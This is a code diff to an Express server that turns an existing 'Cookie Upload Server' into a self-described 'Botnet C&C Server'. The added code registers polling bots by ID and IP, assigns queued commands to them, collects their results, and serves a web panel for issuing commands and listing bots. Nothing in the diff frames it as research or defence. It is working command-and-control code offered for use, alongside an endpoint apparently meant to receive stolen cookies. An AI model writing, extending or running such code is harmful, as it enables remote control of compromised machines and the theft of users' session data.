@@ -6,9 +6,15 @@ const cors = require('cors');
 const app = express();
 const PORT = 3000;
 
+// Botnet data
+let bots = new Map();
+let commands = new Map();
+let commandResults = new Map();
+
 // Middleware
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
+app.use(express.static(path.join(__dirname, 'public')));
 
 // Create uploads directory if it doesn't exist
 const uploadsDir = path.join(__dirname, 'uploads');
@@ -85,8 +91,74 @@ app.get('/download/:filename', (req, res) => {
   }
 });
 
+// Botnet endpoints
+app.get('/commands/:botId', (req, res) => {
+  const botId = req.params.botId;
+  bots.set(botId, {id: botId, lastSeen: new Date(), ip: req.ip});
+  console.log(`Bot ${botId} polling for commands`);
+  
+  // Find pending command for this bot
+  for (let [id, cmd] of commands) {
+    if (cmd.status === 'pending' && (!cmd.assignedBot || cmd.assignedBot === botId)) {
+      cmd.assignedBot = botId;
+      cmd.status = 'assigned';
+      console.log(`Assigning command ${id} to bot ${botId}`);
+      return res.json(cmd);
+    }
+  }
+  
+  res.json({});
+});
+
+app.post('/commands/:commandId/result', (req, res) => {
+  const commandId = req.params.commandId;
+  const result = req.body;
+  
+  console.log(`Received result for command ${commandId}:`, result);
+  commandResults.set(commandId, result);
+  if (commands.has(commandId)) {
+    commands.get(commandId).status = 'completed';
+  }
+  
+  res.json({success: true});
+});
+
+// Web interface endpoints
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+app.get('/api/bots', (req, res) => {
+  const botList = Array.from(bots.values()).map(bot => ({
+    ...bot,
+    online: Date.now() - new Date(bot.lastSeen).getTime() < 60000
+  }));
+  res.json(botList);
+});
+
+app.post('/api/commands', (req, res) => {
+  const command = {
+    id: Date.now().toString(),
+    ...req.body,
+    status: 'pending',
+    created: new Date()
+  };
+  commands.set(command.id, command);
+  res.json(command);
+});
+
+app.get('/api/commands', (req, res) => {
+  const commandList = Array.from(commands.values());
+  res.json(commandList);
+});
+
+app.get('/api/results/:commandId', (req, res) => {
+  const result = commandResults.get(req.params.commandId);
+  res.json(result || {});
+});
+
 app.listen(PORT, () => {
-  console.log(`Cookie Upload Server running on http://localhost:${PORT}`);
+  console.log(`Botnet C&C Server running on http://localhost:${PORT}`);
   console.log(`Upload endpoint: http://localhost:${PORT}/upload`);
-  console.log(`Status endpoint: http://localhost:${PORT}/status`);
+  console.log(`Web interface: http://localhost:${PORT}`);
 });
